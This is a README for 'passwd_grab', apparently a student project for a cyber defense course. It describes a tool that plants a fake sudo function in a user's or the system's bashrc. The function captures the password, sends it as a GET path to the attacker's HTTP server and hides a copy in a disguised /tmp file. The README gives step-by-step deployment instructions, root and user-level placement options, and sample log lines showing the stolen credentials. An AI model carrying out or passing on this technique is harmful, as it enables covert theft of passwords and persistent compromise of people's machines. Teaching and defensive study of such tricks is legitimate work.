# passwd_grab
Project for CSEC-473 Cyber Defense Techniques

Purpose:
  The purpose of this program is to try and exfiltrate a Linux user's credentials via a fake sudo command. The way this is done is by creating a bash function to be copied to the target machine called "sudo ()" that looks like the real sudo command. The function asks for the user's password like the normal "sudo" command would, and then saves this to a file as well as sends the credentials to an http server (the machine that you are running the pwgrabber.py program on). This funciton is copied to the target machine and saved either to the user's ~/.bashrc file or to the machine's /etc/bash.bashrc file (depending on the level of access that you currently have). 
  
Prerequisites:
  -In order for this to work, you must have at least user-level access to a system. Having root-level access will allow for even greater functionality.
  -A computer on the same network as the target will allow for easier exfiltration.
  
How to use:
  1. Download the pwgrabber.py file onto your machine. Make sure you have python3 installed (if not run "sudo apt-get install python3" or "sudo yum install rh-python36")
  2. Run the pwgrabber.py file ("python3 pwgrabber.py"). This gets your IP address, creates a file in the same directory called "PWG5fQ.txt", and starts an http server
  3. Copy the contents of PWG5fQ.txt
  4. If you have root access:
       Copy the contents onto the target machine at "/etc/bash.bashrc" (the system's bashrc file)
     If you have user-level access (no root):
       Copy the contents to "~/.bashrc" (the user's bashrc file)
  5. Wait for the user to type "sudo {anything}". When they do, it will appear normal to them. On your http server, you will see a 404 error in the following format:
  
{target_ip} - - {date} code 404, message File not found
{target_ip} - - {date} "GET /{USER}:{PASSWORD} HTTP/1.1" 404 -

  6. If the connection to your http server is not made, the password will still be saved at "/tmp/config-err-PWG5fQ" in the format "{USER} : {PASSWORD}"
